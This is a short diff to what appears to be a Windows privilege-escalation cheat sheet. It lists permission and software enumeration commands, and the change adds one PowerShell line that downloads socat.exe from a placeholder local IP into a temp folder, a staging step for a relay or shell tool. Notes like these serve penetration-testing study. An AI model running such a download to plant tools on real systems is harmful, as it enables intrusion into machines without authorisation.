@@ -28,7 +28,7 @@ icacls - check permissions.
 icacls FILE /grant GROUP:PERMISSIONS
 whoami /priv
 wmic product get name,version,vendor - list installed software and versions
-
+Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\FILE 
 
 
 Brute-Forcing
